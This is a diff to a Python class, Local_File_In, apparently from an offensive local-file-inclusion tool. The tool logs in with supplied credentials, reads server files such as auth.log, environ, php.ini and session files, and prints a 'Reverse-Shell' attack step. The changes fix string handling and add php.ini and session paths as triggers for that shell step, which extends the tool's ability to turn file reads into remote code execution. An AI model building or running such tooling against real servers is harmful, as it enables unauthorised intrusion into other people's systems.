@@ -18,13 +18,13 @@ class Local_File_In:
         def __init__(self,**kwargs) :          
             try: 
                 with open(self .args.readuser,'r') as username:
-                        self.args.user = username.read().replace('/n','')  
+                        self.args.user = username.read().replace('\n','')  
             except TypeError:
                     pass         
             if self.args.readpass or self.args.config:
                 try:
                     with open(self.args.readpass,'r') as password:
-                       self.args.password = password.read().replace('/n','')
+                       self.args.password = password.read().replace('\n','')
                 except TypeError:
                     pass      
             try:   
@@ -119,7 +119,7 @@ class Local_File_In:
                    request[f'{self.args.UserForm}'] = f'{self.args.user}'
                    request["password"] = f'{self.args.password}'
                elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
-                   request["username"] = '{self.args.user}'
+                   request["username"] = f'{self.args.user}'
                    request[f'{self.args.PassForm}']=f'{self.args.password}' 
                elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                    request[f'{self.args.UserForm}'] = f'{self.args.user}'
@@ -252,7 +252,8 @@ class Local_File_In:
                         print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read.replace('/','',1).replace('/','_').replace('\n',''))
                         if self.args.shell:
                                 if  "auth" in  self.url or "auth.log" in  self.url\
-                                or "environ" in self.url: 
+                                or "environ" in self.url or "/apache2/php.ini" in self.url \
+                                or  "fpm/php.ini" in self.url or 'sessions' in self.url : 
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
@@ -301,7 +302,8 @@ class Local_File_In:
                           +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))   
                         if self.args.shell:
                                 if  "auth" in  self.url or "auth.log" in  self.url\
-                                or "environ" in self.url: 
+                                or "environ" in self.url or "/apache2/php.ini" in self.url \
+                                or  "fpm/php.ini" in self.url or 'sessions' in self.url : 
                                     print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                     time.sleep(1)
                                     print("[+] Attack type          : ................ | : Reverse-Shell") 
